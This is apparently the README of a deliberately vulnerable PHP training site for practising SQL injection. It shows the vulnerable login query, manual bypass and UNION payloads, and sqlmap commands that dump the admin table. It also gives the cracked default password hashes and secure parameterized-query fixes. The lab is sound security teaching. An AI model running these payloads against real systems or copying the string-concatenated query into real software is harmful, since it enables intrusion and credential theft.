# OA 企业网站管理系统 - SQL注入漏洞靶场

## 📋 项目简介

这是一个专为网络安全教育和渗透测试练习设计的企业级网站系统。系统**故意包含SQL注入漏洞**，供安全研究人员和学习者在合法授权环境下进行攻防实验。

> ⚠️ **重要警告**：本项目仅供授权的安全测试和教育目的使用！请勿在互联网环境部署，仅在内网或本地环境使用。使用者需自行承担所有责任并遵守当地法律法规。

## 🎯 漏洞信息

| 项目 | 详情 |
|------|------|
| **漏洞类型** | SQL注入（时间盲注 / Time-based Blind SQL Injection） |
| **注入位置** | `login.php` 的 `username` 参数（POST方法） |
| **数据库类型** | MySQL >= 5.0.12 |
| **风险等级** | 高危 (Critical) |
| **CWE编号** | CWE-89 |

### 漏洞代码示例

```php
// login.php - 存在SQL注入漏洞的代码
$username = $_POST['username'];
$password = $_POST['password'];

// 危险！直接拼接用户输入到SQL语句
$sql = "SELECT * FROM admin_users WHERE username = '$username' AND password = MD5('$password')";
$result = $pdo->query($sql);
```

## 🛠️ 环境要求

- **Web服务器**: Apache 2.4+ / Nginx
- **PHP版本**: 7.4 - 8.2
- **数据库**: MySQL 5.7+ / MariaDB 10.2+
- **PHP扩展**: PDO, PDO_MySQL, Session

## 📦 安装部署

### 1. 下载项目

```bash
git clone https://github.com/Dingchunru/OA.git
cd OA
```

### 2. 导入数据库

```bash
# 登录MySQL
mysql -u root -p

# 创建数据库并导入
CREATE DATABASE IF NOT EXISTS OA_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE OA_db;
SOURCE setup.sql;
```

### 3. 配置数据库连接

```bash
# 复制配置文件模板
cp config/database.php.example config/database.php

# 编辑配置文件
vim config/database.php
```

修改为您的数据库配置：
```php
<?php
$host = 'localhost';        // 数据库主机
$dbname = 'OA_db';          // 数据库名称
$username = 'root';         // 数据库用户名
$password = 'your_password'; // 数据库密码
```

### 4. 配置Web服务器

#### Apache配置示例：
```apache
<VirtualHost *:80>
    DocumentRoot "/var/www/html/OA"
    ServerName oa.local
    
    <Directory "/var/www/html/OA">
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
```

#### 或使用PHP内置服务器（仅限测试）：
```bash
cd /path/to/OA
php -S 0.0.0.0:8080
```

### 5. 访问系统

浏览器访问：`http://localhost/OA` 或 `http://localhost:8080`

## 👤 默认账号

| 用户名 | 密码 | 角色 | 权限 |
|--------|------|------|------|
| `admin` | `Admin@123456` | superadmin | 完全访问 |
| `manager1` | `Manager@123456` | admin | 管理访问 |

## 🗂️ 项目结构

```
OA/
├── index.php              # 首页（新闻展示）
├── login.php              # 登录页面（含SQL注入漏洞）
├── logout.php             # 退出登录
├── admin.php              # 管理后台
├── products.php           # 产品列表页
├── product_detail.php     # 产品详情页（含SQL注入）
├── setup.sql              # 数据库初始化脚本
├── config/
│   ├── database.php       # 数据库配置（需自行创建）
│   └── database.php.example # 配置文件模板
├── includes/
│   ├── header.php         # 公共头部
│   └── footer.php         # 公共尾部
└── assets/
    ├── style.css          # 样式文件
    └── images/            # 图片资源
```

## 🔍 SQL注入测试

### 手动测试

#### 1. 万能密码绕过
```
用户名: admin' OR '1'='1' -- 
密码: 任意内容
```

#### 2. 注释符攻击
```
用户名: admin'#
密码: 任意内容
```

#### 3. 联合查询测试
```
用户名: ' UNION SELECT 1,2,3,4,5,6,7 -- 
密码: 任意内容
```

### 使用SQLMap自动化测试

#### 基础检测
```bash
sqlmap -u "http://localhost/OA/login.php" \
    --data="username=admin&password=123456" \
    --method POST
```

#### 获取数据库列表
```bash
sqlmap -u "http://localhost/OA/login.php" \
    --data="username=admin&password=123456" \
    --method POST \
    --dbs
```

#### 获取管理员账号密码（完整攻击）
```bash
sqlmap -u "http://localhost/OA/login.php" \
    --data="username=admin&password=123456" \
    --method POST \
    -D OA_db \
    -T admin_users \
    --dump \
    --batch \
    --time-sec=2
```

#### 测试产品页面注入
```bash
# 产品分类注入
sqlmap -u "http://localhost/OA/products.php?category=硬件"

# 产品详情注入
sqlmap -u "http://localhost/OA/product_detail.php?id=1" \
    -D OA_db \
    -T admin_users \
    --dump
```

## 📊 预期攻击结果

成功执行SQLMap后，将获取到：

```
Database: OA_db
Table: admin_users
[2 entries]
+----+----------+----------------------------------+------------------------+------------+
| id | username | password                         | email                  | role       |
+----+----------+----------------------------------+------------------------+------------+
| 1  | admin    | 0f2797f2182804d0cc7f0b85d254c146 | admin@enterprise.com   | superadmin |
| 2  | manager1 | da5c4973d34d3496db2efd526b551e89 | manager@enterprise.com | admin      |
+----+----------+----------------------------------+------------------------+------------+
```

### 密码哈希破解

| 哈希值 | 明文密码 | 哈希类型 |
|--------|----------|----------|
| `0f2797f2182804d0cc7f0b85d254c146` | `Admin@123456` | MD5 |
| `da5c4973d34d3496db2efd526b551e89` | `Manager@123456` | MD5 |

## 🛡️ 漏洞修复建议

### 不安全的代码（当前版本）
```php
// ❌ 危险：直接拼接用户输入
$sql = "SELECT * FROM admin_users WHERE username = '$username' AND password = MD5('$password')";
$result = $pdo->query($sql);
```

### 安全的代码（推荐修复）
```php
// ✅ 安全：使用参数化查询/预编译语句
$stmt = $pdo->prepare("SELECT * FROM admin_users WHERE username = ? AND password = MD5(?)");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();

// 更好的做法：使用password_hash
$stmt = $pdo->prepare("SELECT * FROM admin_users WHERE username = ?");
$stmt->execute([$username]);
$user = $stmt->fetch();

if ($user && password_verify($password, $user['password'])) {
    // 登录成功
}
```

### 其他安全建议
1. **输入验证**: 对所有用户输入进行严格的类型检查和过滤
2. **最小权限原则**: 数据库连接使用最小权限账号
3. **错误处理**: 禁止向用户显示数据库错误信息
4. **WAF部署**: 部署Web应用防火墙
5. **定期审计**: 定期进行代码审计和安全测试

## 📈 功能特性

- [x] 用户登录/退出
- [x] 管理后台仪表盘
- [x] 产品展示与分类
- [x] 新闻公告系统
- [x] 响应式设计
- [x] Session管理
- [x] 数据统计展示

## 🐛 已知漏洞

| 漏洞位置 | 类型 | 参数 | 风险 |
|----------|------|------|------|
| `/login.php` | SQL注入（时间盲注） | `username` (POST) | 高危 |
| `/products.php` | SQL注入 | `category` (GET) | 高危 |
| `/product_detail.php` | SQL注入 | `id` (GET) | 高危 |

## 🔧 故障排除

### 问题1: 数据库连接失败
```
解决方案：
1. 检查 config/database.php 配置是否正确
2. 确认MySQL服务已启动
3. 检查数据库用户权限
```

### 问题2: 页面样式丢失
```
解决方案：
1. 检查 assets/style.css 路径是否正确
2. 确认Apache的AllowOverride配置
```

### 问题3: Session无法保存
```
解决方案：
1. 检查PHP的session.save_path权限
2. 确保session目录可写
```

## 📚 学习资源

- [OWASP SQL注入](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap官方文档](https://github.com/sqlmapproject/sqlmap/wiki)
- [PHP安全编程指南](https://www.php.net/manual/zh/security.php)

## ⚖️ 法律声明

本软件仅供安全研究和教育目的使用。使用者必须遵守以下规定：

1. 仅在获得明确授权的系统上使用
2. 不得用于任何非法活动
3. 使用者承担所有法律责任
4. 作者不对任何滥用行为负责

## 📄 许可证

本项目仅用于教育目的，不提供任何明示或暗示的担保。

## 👨‍💻 作者

**Dingchunru**
- GitHub: [@Dingchunru](https://github.com/Dingchunru)

## ⭐ 致谢

感谢所有为网络安全教育做出贡献的研究者和开发者。

---

**最后更新**: 2026-04-10  
**版本**: v1.0.0
